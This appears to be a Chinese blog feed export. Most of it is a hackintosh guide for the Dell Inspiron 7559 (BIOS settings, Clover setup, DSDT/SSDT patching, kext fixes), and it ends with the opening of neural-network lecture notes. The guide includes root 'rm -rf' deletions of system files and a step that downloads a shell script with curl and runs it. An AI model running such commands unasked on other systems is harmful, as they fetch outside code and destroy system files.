ALC256</li><li>BIOS版本:1.2.8</li></ul><h2 id="BIOS准备"><a href="#BIOS准备" class="headerlink" title="BIOS准备"></a>BIOS准备</h2><ol><li>如果cpu是i5的,则需要去官网下载1.0.1的BIOS版本刷入</li><li>更改BIOS设置如下</li></ol><pre><code> - 恢复BIOS默认设置 - AHCI mode 选择 SATA - 关闭 VT for direct I/O - 关闭 Advanced Battery Charging - 关闭 Secure boot - 关闭 SupportAssist System Resolution - 关闭 Firmware TPM</code></pre><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><ol><li><p>下载macOS Mojave镜像: <a href="https://blog.daliansky.net/macOS-Mojave-10.14.3-18D42-official-version-with-Clover-4859-original-image.html" target="_blank" rel="noopener">【黑果小兵】macOS Mojave 10.14.3 18D42 正式版 with Clover 4859原版镜像</a></p></li><li><p>检查下载的系统的md5是否是下载链接处提供的<code>450c55e5c5d3f4bfae6bb55ff2a33aea</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128203547.png" alt></p><p> (1) windows下,使用<code>certutil</code>命令</p><pre><code> certutil -hashfile 系统镜像 MD5</code></pre><p> (2) mac下使用<code>md5</code></p><pre><code> md5 系统镜像</code></pre></li></ol><ol start="3"><li><p>如果在windows下,则使用<code>transmac</code>将镜像写入U盘,如果在mac上,则使用<code>balenaEtcher</code>将镜像写入U盘<br> (1) 使用<code>transmac</code>将镜像写入U盘:先选择<code>Format Disk for Mac</code>格式化为Mac格式,然后选择<code>Restore with Disk Image</code>将镜像写入U盘<br> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128202859.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128203110.png" alt></p><p> (2) 使用<code>balenaEtcher</code>将镜像写入U盘:傻瓜式操作,选择下载的系统镜像,选择U盘,然后点击<code>Flash</code>,等待即可<br> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128203143.png" alt></p></li><li><p>在windows下,使用<code>Diskgenius</code>,mac下使用<code>Clover Configurator</code>挂载U盘的EFI分区,然后将附件中的<code>CLOVER</code>文件夹<strong>替换</strong>u盘<code>EFI</code>文件夹中的<code>CLOVER</code></p><blockquote><p>ps:如果你的配置以及Bios版本和我的一致,先删除U盘中的<code>CLOVERE</code>,然后你可以直接将附件中的<code>最终的CLOVER</code>重命名成CLOVER,然后放到U盘的EFI分区里面</p></blockquote><p> (1) 使用<code>Diskgenius</code>替换<code>CLOVER</code>: 这里记得一点,删除原来的<code>CLOVER</code>之后,直接将附件的<code>CLOVER</code>拖动进去是没用的,需要用快捷键<code>CTRL+C</code>和<code>CTRL+V</code><br> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128202335.png" alt></p><p> (2) 使用<code>Clover Configurator</code>分别挂载U盘和本地的EFI<br> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128204039.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128204301.png" alt></p></li><li><p>然后可以拿着这个U盘启动盘去装系统了,具体的如何安装系统以及将启动U盘的CLOVER放在本地的EFI下的步骤这里略过,如果上面的操作正常,安装完成后是可以进入到mac系统的</p></li></ol><h2 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h2><ol><li><p>移除驱动，终端输入：</p><pre><code> sudo rm -rf /System/Library/Extensions/AppleACPIPS2Nub.kext</code></pre></li><li><p>将附件中的驱动使用<code>KCMP Utility Pro</code>安装至<code>L/E</code>分区,非常简单,将这些驱动全部拖进去即可安装</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128204359.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128204451.png" alt></p></li><li><p>重启准备进行<code>dsdt</code>和<code>ssdt</code>制作</p></li></ol><h2 id="DSDT和SSDT文件制作"><a href="#DSDT和SSDT文件制作" class="headerlink" title="DSDT和SSDT文件制作"></a>DSDT和SSDT文件制作</h2><blockquote><p>如果你对BIOS版本和我的一样,那么直接用我<code>CLOVER/ACPI/patched</code>文件夹里面的文件即可,也就是说不用看这节的内容了.需要说明的是,一般来说,不同BIOS版本的文件不能通用，容易出错</p></blockquote><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><ol><li><p>开机选择Mac图标,按下<code>F4</code>，所需文件将会出现在<code>EFI/Clover/ACPI/origin</code>文件夹</p></li><li><p>使用<code>Clover Configurator</code>加载引导分区EFI,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220355.png" alt></p></li><li><p>将<code>EFI/Clover/ACPI/</code>下的<code>origin</code>文件夹复制到桌面</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220418.png" alt></p></li><li><p>复制附件中的<code>iasl</code>和<code>refs</code>文件至桌面的<code>origin</code>文件夹</p></li><li><p>终端输入:</p><pre><code> cd ~/Desktop/origin sudo cp iasl /usr/bin iasl -da -dl -fe refs.txt DSDT.aml SSDT*.aml</code></pre><p> 将会有<code>****.dsl</code>文件创建于<code>origin</code>文件夹,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220427.png" alt></p></li></ol><h4 id="DSDT文件制作"><a href="#DSDT文件制作" class="headerlink" title="DSDT文件制作"></a>DSDT文件制作</h4><blockquote><p>注意每改一下,都要<code>Compile</code>一下,查看是否有error,修复它,不管warning</p></blockquote><ol><li><p>使用<code>MaciASL.app</code>打开<code>DSDT.dsl</code>文件</p></li><li><p>点击<code>Compile</code>,出现4个error,都是<code>PARSEOP_EXP_MULTIPLY</code>错误,双击跳转到error位置,删掉这四行即可,如果遇到其他错误自行百度</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220439.png" alt></p></li><li><p>查找<code>HECI</code> 用<code>IMEI</code>替代;查找<code>HDAS</code> 用<code>HDEF</code>替代,</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220532.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220541.png" alt></p><p> 然后再<code>Compile</code>一下,不用管<code>Warnings</code>,没有<code>Errors</code>即可</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220603.png" alt></p></li><li><p>点击<code>Patch</code>,在<code>RehabMan Laptop</code>下,查找到以下项目，单击后按<code>Apply</code></p><pre><code> -[syn] Rename _DSM methods to XDSM -[Audio] Audio Layout 3 -[bat] Dell Inspiron 15-7xxx -[sys] Fix _WAK Arg0 v2 -[sys] Fix Mutex with non-zero SyncLevel -[sys] HPET Fix -[sys] IRQ fix -[sys] RTC Fix -[sys] Skylake LPC -[sys] SMBUS Fix -[usb] USB3_PRW 0x6D Skylake (instant wake)</code></pre><p> (1) 下面以<code>[syn] Rename _DSM methods to XDSM</code>为例,点击<code>Patch</code>,选择<code>_RehabMan Laptop</code>(这个名字是自己取的,只要Patch源是  <a href="http://raw.github.com/RehabMan/Laptop-DSDT-Patch/master" target="_blank" rel="noopener">http://raw.github.com/RehabMan/Laptop-DSDT-Patch/master</a> 即可)</p><blockquote><p>我放在附件中的<code>MaciASL</code>是最新版本的,已经包含了<code>RehabMan Laptop</code>的源,如下图.如果你发现点击<code>Patch</code>之后<strong>显示空白</strong>,则说明网络不好,要么等一会,要么科学上网.</p></blockquote><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128185836.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220635.png" alt></p><p> (2) 选择<code>[syn] Rename _DSM methods to XDSM</code>之后,等一会,然后点击<code>Apply</code>,然后再等一会,指导右边上下两个框框都没有东西了,说明替换成功</p><blockquote><p>ps:这里多说一句,如果你是程序员的话,应该明白,这个本质就是通过正则匹配,然后替换成指定内容而已,当然这个具体为什么替换成这些内容,只有问RehabMan大佬了</p></blockquote><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220653.png" alt></p></li><li><p>查找<code>layout</code>，并将<code>3</code>替换为<code>13</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220704.png" alt></p></li><li><p>点击<code>Compile</code>,不管Warnings,有error就修复</p></li><li><p>接下来屏蔽独显： 开头处添加</p><pre><code> External (_SB_.PCI0.PEG0.PEGP._PS3, MethodObj) External (_SB_.PCI0.PEG0.PEGP._PS0, MethodObj) External (_SB_.PCI0.PEG0.PEGP._OFF, MethodObj) External (_SB_.PCI0.PEG0.PEGP._ON, MethodObj) External (_SB_.PCI0.PEG0.PEGP.SGOF, MethodObj) External (_SB_.PCI0.PEG0.PEGP.SGON, MethodObj)</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220725.png" alt></p><p> 搜索<code>_WAK</code>，并在其之前添加</p><pre><code> Method (M_ON, 0, NotSerialized)     {         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._ON))         {             \_SB_.PCI0.PEG0.PEGP._ON()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._PS0))         {             \_SB_.PCI0.PEG0.PEGP._PS0()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP.SGON))         {             \_SB_.PCI0.PEG0.PEGP.SGON()         }     } Method (M_OF, 0, NotSerialized)     {         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._OFF))         {             \_SB_.PCI0.PEG0.PEGP._OFF()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._PS3))         {             \_SB_.PCI0.PEG0.PEGP._PS3()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP.SGOF))         {             \_SB_.PCI0.PEG0.PEGP.SGOF()         }     }</code></pre><p> 如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220755.png" alt></p><p> 搜索<code>_WAK</code>，添加<code>M_OF()</code>,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220811.png" alt></p><p> 搜索<code>_PTS</code>，添加<code>M_ON()</code>,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220833.png" alt></p><p> 搜索<code>Method (_INI, 0, Serialized)</code>，并在图示位置添加<code>M_OF()</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220845.png" alt></p></li><li><p>点击<code>Compile</code>，检查有无错误，无错误则选择<code>File</code>-&gt;<code>Save as...</code>-&gt;<code>ACPI Machine Language Binary</code>格式保存至桌面，有错误则从头再来</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310183150.png" alt></p></li></ol><h4 id="SSDT-5-SaSsdt-aml制作"><a href="#SSDT-5-SaSsdt-aml制作" class="headerlink" title="SSDT-5-SaSsdt.aml制作"></a>SSDT-5-SaSsdt.aml制作</h4><ol><li><p>打开<code>SSDT-5-SaSsdt.dsl</code>，先点<code>Compile</code>,没有error之后,再点击<code>patch</code>，选择<code>[igpu] Rename GFX0 to IGPU</code>  然后点击<code>Apply</code>,同理另存为<code>ACPI Machine Language Binary</code>格式保存至<strong>桌面,</strong>如下两个图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220855.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220918.png" alt></p></li><li><p>拷贝制作的<code>SSDT-5-SaSsdt.aml</code>文件和附件中<code>SSDT-PNLF.aml</code>、<code>SSDT-UIAC.aml</code>至引导分区<code>EFI/Clover/ACPI/patched</code></p></li></ol><h4 id="制作SSDT-aml"><a href="#制作SSDT-aml" class="headerlink" title="制作SSDT.aml"></a>制作SSDT.aml</h4><ul><li>打开终端,输入下方两条指令</li></ul><pre><code>curl -o ssdtPRGen.sh https://raw.githubusercontent.com/Piker-Alpha/ssdtPRGen.sh/Beta/ssdtPRGen.shchmod +x ssdtPRGen.sh</code></pre><ul><li>如果是i7 6700HQ使用</li></ul><pre><code>./ssdtPRGen.sh -p &#39;i7-6700HQ&#39; -f 2600 -turbo 3500</code></pre><ul><li>如果是i5 6300HQ使用</li></ul><pre><code>./ssdtPRGen.sh -p &#39;i5-6300HQ&#39; -f 2300 -turbo 3200</code></pre><p>根据提示选择<code>y</code>、<code>n</code></p><pre><code>cp /Users/用户名/Library/ssdtPRGen/ssdt.aml /Users/用户名/Desktop/SSDT.aml</code></pre><p>同理把<code>SSDT.aml</code>拷贝至引导分区<code>EFI/Clover/ACPI/patched</code> 至此你的<code>patched</code>文件夹应包含以下内容</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220929.png" alt></p><p>然后重启即可</p><h2 id="蓝牙不可关闭修复"><a href="#蓝牙不可关闭修复" class="headerlink" title="蓝牙不可关闭修复"></a>蓝牙不可关闭修复</h2><blockquote><p>总结起来就是,根据供应商ID,找到产品ID,然后正确修改产品ID</p></blockquote><ol><li><p><code>关于本机</code>-&gt;<code>系统报告</code>-&gt;找到蓝牙的供应商ID和产品ID</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127155708.png" alt></p><pre><code> 供应商 ID：   0x8087 产品 ID：    0x0A2A</code></pre></li><li><p>转换为10进制</p><pre><code> 供应商 ID：    32903 产　品 ID：    2602</code></pre></li><li><p>编辑<code>/System/Library/Extensions/IOBluetoothFamily.kext/Contents/PlugIns/BroadcomBluetoothHostControllerUSBTransport.kext/Contents/Info.plist</code>文件，搜索 <code>IOKitPersonalities</code>,然后修改<code>idVendor</code>值为<code>32903</code>和<code>idProduct</code>的值为<code>2602</code>如下：<br> 原来的如下</p><pre class=" language-xml"><code class="language-xml">     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOKitPersonalities<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>Broadcom2045FamilyUSBBluetoothHCIController_D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>CFBundleIdentifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>com.apple.iokit.BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOProviderClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>IOUSBHostDevice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idProduct<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>33292<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idVendor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>1452<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span></code></pre><p> 修改后如下</p><pre class=" language-xml"><code class="language-xml">     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOKitPersonalities<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>Broadcom2045FamilyUSBBluetoothHCIController_D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>CFBundleIdentifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>com.apple.iokit.BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOProviderClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>IOUSBHostDevice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idProduct<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>2602<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>idVendor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>integer</span><span class="token punctuation">></span></span>32903<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>integer</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dict</span><span class="token punctuation">></span></span></code></pre></li><li><p>使用<code>Kext Utility</code>修复权限和重建缓存即可</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127155800.png" alt></p></li><li><p>效果如下,可开启,可关闭</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127224543.png" alt></p></li></ol><h2 id="耳机爆音修复"><a href="#耳机爆音修复" class="headerlink" title="耳机爆音修复"></a>耳机爆音修复</h2><ol><li><p>进入附件的<code>ALCPlugFix</code>目录</p></li><li><p>双击<code>install双击自动安装.command</code></p></li><li><p>用<code>Clover Configurator</code>打开<code>EFI/Clover/config.plist</code>,切换到<code>Boot</code>,在<code>Custom Flags</code>添加<code>-lilubetaall -alcbeta</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127221156.png" alt></p></li><li><p>切换到<code>Devices</code>标签,Audio下的Inject选择13</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127221357.png" alt></p></li><li><p>重启</p></li></ol><h2 id="触摸板"><a href="#触摸板" class="headerlink" title="触摸板"></a>触摸板</h2><blockquote><p>进行了这步操作,触摸板可进行软点击,但是多指手势就没了</p></blockquote><ol><li><p>安装指导链接 <a href="https://github.com/RehabMan/OS-X-Voodoo-PS2-Controller/wiki/How-to-Install" target="_blank" rel="noopener">https://github.com/RehabMan/OS-X-Voodoo-PS2-Controller/wiki/How-to-Install</a></p></li><li><p>软件下载链接 <a href="https://bitbucket.org/RehabMan/os-x-voodoo-ps2-controller/downloads/" target="_blank" rel="noopener">https://bitbucket.org/RehabMan/os-x-voodoo-ps2-controller/downloads/</a></p></li><li><p>从<code>/S/L/E</code>和<code>/L/E</code>中删除不兼容的kexts：</p><pre><code> sudo rm -rf /System/Library/Extensions/AppleACPIPS2Nub.kext sudo rm -rf /System/Library/Extensions/ApplePS2Controller.kext sudo rm -rf /System/Library/Extensions/ApplePS2SmartTouchPad.kext sudo rm -rf /Library/Extensions/AppleACPIPS2Nub.kext sudo rm -rf /Library/Extensions/ApplePS2Controller.kext sudo rm -rf /Library/Extensions/ApplePS2SmartTouchPad.kext</code></pre></li><li><p>安装VoodooPS2Controller.kext（10.11及更高版本）：</p><pre><code> cd directory-to-where-your-unzipped-download-is sudo cp -R Release/VoodooPS2Controller.kext /Library/Extensions</code></pre></li><li><p>重建内核缓存：</p><pre><code> sudo touch /System/Library/Extensions &amp;&amp; sudo kextcache -u /</code></pre></li><li><p>然后重启系统。</p></li><li><p>如果发现笔记本自带键盘<code>windows</code>键和<code>alt</code>键的功能交换了,则需要用到<code>Karabiner</code>交换<code>windows</code>和<code>alt</code>的功能</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211336.png" alt></p></li></ol><h3 id="AppleSmartTouchPad"><a href="#AppleSmartTouchPad" class="headerlink" title="AppleSmartTouchPad"></a>AppleSmartTouchPad</h3><blockquote><p>这时候,如果去<code>/L/E</code>删了<code>VoodooPS2Controller</code>,装回<code>ApplePS2SmartTouchPad</code>,就会发现新世界,不仅仅软点击好了,要啥啥都都有</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190227085451.png" alt></p><ul><li>这些手势不是全部能用,但是大部分都可以,手势记录如下</li></ul><table><thead><tr><th>手势</th><th>效果</th></tr></thead><tbody><tr><td>单指单击</td><td>鼠标左键</td></tr><tr><td>双指边缘手势，由外划至触摸板中心（左右-切换虚拟桌面或全屏应用）</td><td>全屏下应用切换</td></tr><tr><td>双指上下滚动、单指边缘滚动</td><td>滚动页面</td></tr><tr><td>三指单击</td><td>鼠标右键</td></tr><tr><td>四指单击</td><td>删除</td></tr><tr><td>四指向上</td><td>missing control</td></tr></tbody></table><h2 id="10-14-1升级10-14-3的背光修复"><a href="#10-14-1升级10-14-3的背光修复" class="headerlink" title="10.14.1升级10.14.3的背光修复"></a>10.14.1升级10.14.3的背光修复</h2><blockquote><p>如果你是按照我的教程来重新安装10.14.3,那么不用看下面,如果你是安装我参照的教程安装的10.14或10.14.1,则需要执行下方教程</p></blockquote><ol><li>升级完成后,发现声音没了,背光无法调节</li><li>下载亮度调节驱动下载: <a href="https://bitbucket.org/RehabMan/applebacklightfixup/downloads/" target="_blank" rel="noopener">https://bitbucket.org/RehabMan/applebacklightfixup/downloads/</a></li><li>通过<code>KCPM Utility Pro</code>将<code>AppleBacklightFixup.kext</code>装进<code>/L/E/</code>下</li><li>将<code>EFI/EFI/CLOVER/ACPI/patched</code>下的,原来<code>的SSDT-PNLF.aml</code>和<code>SSDT-PNLF-AppleBacklight.aml</code>删掉</li><li>然后将下载下来的<code>SSDT-PNLF.aml</code>放在<code>patched</code>下</li><li>重启即可</li></ol><blockquote><p>本教程的所有文件已经上传到GitHub上,请上GitHub下载,<a href="https://github.com/fengwenhua/dell-7559-hackintosh" target="_blank" rel="noopener">dell 7559 教程附件GitHub地址</a></p></blockquote><h2 id="2019-3-1升级最新补丁-声卡背光失效"><a href="#2019-3-1升级最新补丁-声卡背光失效" class="headerlink" title="2019.3.1升级最新补丁(声卡背光失效)"></a>2019.3.1升级最新补丁(声卡背光失效)</h2><ol><li>将<code>/L/E/</code>下的<code>AppleBacklightFixup.kext</code>删掉</li><li><code>EFI/EFI/CLOVER/kexts/Other</code>下的<code>Lilu_v1.2.7</code>删掉,去<a href="https://github.com/acidanthera/Lilu/releases" target="_blank" rel="noopener">github Lilu</a>下载最新版的<code>Lilu_v1.3.4</code>换上去</li><li>去<a href="https://github.com/acidanthera/WhateverGreen/releases" target="_blank" rel="noopener">github whatevergreen</a>下载最新的<code>whatevergreen_v1.2.6</code>到<code>EFI/EFI/CLOVER/kexts/Other</code></li><li>删掉<code>EFI/EFI/CLOVER/kexts/Other</code>下的<code>IntelGraphicsFixup.kext</code>,因为会和<code>whatevergreen</code>冲突</li><li><del>修改<code>config.plist</code>,将<code>Devices</code>-&gt;<code>Audio</code>-&gt;<code>Inject</code>改为<code>No</code>,取消勾选<code>ResetHDA</code>.</del> 然后到<code>System Parameters</code>-&gt;<code>Inject Kexts</code>改为<code>Yes</code></li><li>去<a href="https://github.com/acidanthera/AppleALC/releases" target="_blank" rel="noopener">github AppleALC</a>下载最新版的<code>AppleALC_v1.3.5</code></li><li>通过<code>KCPM Utility Pro</code>重建缓存</li><li>重启电脑</li></ol><ul><li>已知问题:</li></ul><ol><li>背光无法保存</li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 黑苹果 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑苹果 </tag>
            
            <tag> hackintosh </tag>
            
            <tag> dell-7559 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八章-神经网络-表述(Neural-Networks-Representation)</title>
      <link href="/2019/02/13/di-ba-zhang-shen-jing-wang-luo-biao-shu-neural-networks-representation/"/>
      <url>/2019/02/13/di-ba-zhang-shen-jing-wang-luo-biao-shu-neural-networks-representation/</url>
      
        <content type="html"><![CDATA[<h1 id="第八章-神经网络：表述-Neural-Networks-Representation"><a href="#第八章-神经网络：表述-Neural-Networks-Representation" class="headerlink" title="第八章 神经网络：表述(Neural Networks: Representation)"></a>第八章 神经网络：表述(Neural Networks: Representation)</h1><hr><h2 id="8-1-非线性假设（Non-linear-Hypotheses）"><a href="#8-1-非线性假设（Non-linear-Hypotheses）" class="headerlink" title="8.1 非线性假设（Non-linear Hypotheses）"></a>8.1 非线性假设（Non-linear Hypotheses）</h2><p>在这节课和接下来的课程中 我将给大家介绍 一种叫<code>“神经网络”(Neural Network)</code> 的机器学习算法</p><p>我们将首先讨论 神经网络的<strong>表层结构</strong> 在后续课程中 再来具体讨论的学习算法 神经网络实际上是一个 相对古老的算法 并且后来沉寂了一段时间 不过到了现在 它又成为许多机器学习问题 的首选技术</p><p>不过我们为什么还需要这个学习算法？ 我们已经有线性回归和逻辑回归算法了 为什么还要研究神经网络？</p><p>为了阐述研究<strong>神经网络算法的目的</strong> 我们首先来看几个机器学习问题作为例子 这几个问题的解决 都依赖于研究复杂的<code>非线性分类器</code></p><p>考虑这个监督学习分类的问题 我们已经有了对应的训练集 如果利用<code>逻辑回归算法</code> 来解决这个问题 首先需要构造 一个包含很多<strong>非线性项</strong>的逻辑回归函数 这里g仍是<code>s型函数 (即f(x)=1/(1+e^-x) )</code> 我们能让函数 包含很多像这样的多项式项 事实上 当多项式项数足够多时 那么可能 你能够得到一个 分开正样本和负样本的分界线</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110234006.png" alt></p><p>当只有两项时 比如 x1 x2 这种方法确实能得到不错的结果 因为你可以 把x1和x2的所有组合 都包含到多项式中 但是对于许多 复杂的机器学习问题 涉及的项往往多于两项</p><p>我们之前已经讨论过 <strong>房价预测的问题</strong> 假设现在要处理的是 关于<strong>住房的分类问题</strong> 而不是一个回归问题 假设你对一栋房子的多方面特点 都有所了解 你想预测 房子在未来半年内 能被卖出去的概率 这是一个<strong>分类问题</strong></p><p>我们可以想出 很多特征 对于不同的房子有可能 就有上百个特征</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110234257.png" alt></p><p>对于这类问题 如果要包含 所有的二次项 即使只包含 二项式或多项式的计算 最终的多项式也可能有很多项</p><p>比如x1^2 x1x2 x1x3 x1x 直到x1x100 还有x2^2 x2x3 等等很多项 因此 即使只考虑二阶项 也就是说 <strong>两个项的乘积</strong> x1乘以x1 等等类似于此的项 那么 在n=100的情况下 最终也有5000个二次项</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110234500.png" alt></p><p>而且渐渐地 随着特征个数n的增加 二次项的个数大约以<code>n^2</code>的量级增长 其中 n是原始项的个数 即我们之前说过的x1到x100这些项 事实上二次项的个数大约是(n^2)/2</p><p>因此要包含所有的 二次项是很困难的 所以这可能 